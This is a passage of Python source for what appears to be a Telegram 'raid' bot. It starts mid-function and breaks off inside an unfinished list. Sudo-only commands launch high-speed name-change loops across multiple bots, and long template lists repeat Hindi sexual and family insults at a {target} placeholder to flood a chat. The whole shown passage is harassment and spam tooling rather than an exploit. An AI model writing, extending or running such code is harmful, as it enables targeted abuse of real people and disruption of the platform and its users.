    await u.message.reply_text(f"✅ GOJO NC4 STARTED: {base}\n⚡ ULTRA SPEED")

@only_sudo
async def gojonc5_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /gojonc5 <text>")
    base = " ".join(c.args)
    _start_nc(u, base, make_nc5, "nc5")
    await u.message.reply_text(f"✅ GOJO NC5 STARTED: {base}\n⚡ ULTRA SPEED")

@only_sudo
async def gojorush_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ ᴜꜱᴇ: /gojorush <text>")
    base = " ".join(c.args)
    _start_nc(u, base, make_nc9, "rush")
    await u.message.reply_text(f"✅ {base} — Gᴏᴊᴏʀᴜꜱʜ ꜱᴛᴀʀᴛᴇᴅ ᴡɪᴛʜ {len(bots)} ʙᴏᴛꜱ!\n⚡ ᴜʟᴛʀᴀ ꜱᴘᴇᴇᴅ")

@only_sudo
async def gojostop_cmd(u, c):
    cid = u.message.chat_id
    stop_all_for_chat(cid, "nc")
    await u.message.reply_text("🛑 𝐆𝐎𝐉𝐎 𝐍𝐂 𝐒𝐓𝐎𝐏𝐏𝐄𝐃! 🔥")


# ================= SUKUNA SPAM TEXTS (ALL ORIGINAL) =================

SUKUNA_SPAM1_TEXTS = [
    """ Sukuna ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌺꒰ঌ𓆩♡𓆪໒꒱🌺
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🎵˚₊·✦🎶⊹♪
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧.*🦈𓂃🫧⊹
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌻₊˚⊹🌼·꒰🌿꒱
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🎧ྀི｡˚🐈‍⬛.𖥔˖♬
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 💫˚₊·🌙⋆｡°
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌟꒱♡꒰🌟˖⋆
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ◟✦🔮ꕁ🪁˚ෆ₊
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧˖°･🌠🛸✩
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌟꒱♡꒰🌟˖⋆
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧.*🦈𓂃🫧⊹
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌺꒰ঌ𓆩♡𓆪໒꒱🌺
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🔖⋆ଳ₊⊹🌀˖°
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌻₊˚⊹🌼·꒰🌿꒱
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🎧ྀི｡˚🐈‍⬛.𖥔˖♬
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌈✦₊˚🎀⊹♡
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌙˚⋆🌸💫✦
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 𓂃˚✦₊˚👾
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧˖°･🌠🛸✩
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌻₊˚⊹🌼·꒰🌿꒱
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌻₊˚⊹🌼·꒰🌿꒱
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🪷⋆｡°✩🌙˚₊‧
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 𓂃˚✦₊˚👾
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🔖⋆ଳ₊⊹🌀˖°~ 
{target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧.*🦈𓂃🫧⊹
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🎠·˚🌙✦₊˚
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 💫˚₊·🌙⋆｡°
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧˖°･🌠🛸✩
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧˖°･🌠🛸✩
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧.*🦈𓂃🫧⊹
 ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🎠·˚🌙✦₊˚
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🫧⭒‧.¸.‧°🌊𐀔⋆｡˚ֶָ֢
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧.*🦈𓂃🫧⊹
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🫧⭒‧.¸.‧°🌊𐀔⋆｡˚ֶָ֢
Sukuna ~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🎧ྀི｡˚🐈‍⬛.𖥔˖♬
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌈✦₊˚🎀⊹♡
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🎵˚₊·✦🎶⊹♪
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🎵˚₊·✦🎶⊹♪
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 𓂃˚✦₊˚👾
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ ✧.*🦈𓂃🫧⊹
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌟꒱♡꒰🌟˖⋆
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌊˚✦₊🐚⊹🫧˖°
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌺꒰ঌ𓆩♡𓆪໒꒱🌺
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌊˚✦₊🐚⊹🫧˖°
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🔖⋆ଳ₊⊹🌀˖°
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🫧⭒‧.¸.‧°🌊𐀔⋆｡˚ֶָ֢
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌙✦🌸˚₊♡˖°⋆
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🌻₊˚⊹🌼·꒰🌿꒱
~ {target} #devil𝐊ᴇ 𝐇ᴀᴛᴇʀ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐉ᴀᴅᴜ 𝐒ᴇ 𝐂ʜᴏᴅ 𝐃ɪʏᴀ~ 🔖⋆ଳ₊⊹🌀˖°""",
]

SUKUNA_SPAM2_TEXTS = [
    """𓆩⚜️𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚜️𓆪

𓆩⚜️𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚜️𓆪

𓆩⚜️𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚜️𓆪

𓆩⚜️𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚜️𓆪

𓆩⚜️𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚜️𓆪

𓆩⚜️𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚜️𓆪

𓆩⚜️𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚜️𓆪""",
    """𓆩⚡𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚡𓆪

𓆩⚡𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚡𓆪

𓆩⚡𓆪 {target} #devil #𝐒ᴘᴀᴍ #se  #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚡𓆪

𓆩⚡𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚡𓆪

𓆩⚡𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩⚡𓆪""",
    """𓆩👾𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩👾𓆪

𓆩👾𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩👾𓆪

𓆩👾𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩👾𓆪

𓆩👾𓆪 {target} #devil #𝐒ᴘᴀᴍ #se  #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩👾𓆪

𓆩👾𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩👾𓆪""",
    """𓆩🎧𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🎧𓆪

𓆩🎧𓆪 {target} #devil #𝐒ᴘᴀᴍ #se  #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🎧𓆪

𓆩🎧𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🎧𓆪

𓆩🎧𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🎧𓆪

𓆩🎧𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🎧𓆪""",
    """𓆩🧃𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🧃𓆪

𓆩🧃𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🧃𓆪

𓆩🧃𓆪 {target} #devil #𝐒ᴘᴀᴍ #se  #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🧃𓆪

𓆩🧃𓆪 {target} #devil #𝐒ᴘᴀᴍ #se  #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🧃𓆪

𓆩🧃𓆪 {target} #devil #𝐒ᴘᴀᴍ #se #𝐓ᴇʀɪ #𝐀ᴍᴍᴀ #𝐂ʜᴜᴅ𝐓ɪ #𝐇ᴀ𝐈𝐈⃠𓆩🧃𓆪""",
]

SUKUNA_SPAM3_TEXTS = [
    """⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩♨️𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩♨️𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩♨️𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩♨️𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩♨️𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩♨️𓆪

⟨⟨ {target} ⟩⟩  𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩♨️𓆪""",
    """⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛩️𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛩️𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛩️𓆪

⟨⟨ {target} ⟩⟩  𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛩️𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛩️𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛩️𓆪""",
    """⟨⟨ {target} ⟩⟩  𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛲𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛲𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛲𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛲𓆪

⟨⟨ {target} ⟩⟩  𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩⛲𓆪""",
    """⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩👾𓆪

⟨⟨ {target} ⟩⟩  𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩👾𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩👾𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩👾𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩👾𓆪""",
    """⟨⟨ {target} ⟩⟩  𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩💢𓆪

⟨⟨ {target} ⟩⟩  𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩💢𓆪

⟨⟨ {target} ⟩⟩  𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩💢𓆪

⟨⟨ {target} ⟩⟩  𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩💢𓆪

⟨⟨ {target} ⟩⟩ 𝐓ᴇʀᴀ 𝐁ᴀᴀᴘ 𝐁ʜɪ 𝐓ɪᴋᴀ 𝐇 10 𝐃ɪɴ 𝐒ᴇ 𝐔ᴘᴀʀ❓ 𓆩💢𓆪""",
]

SUKUNA_SPAM4_TEXTS = [
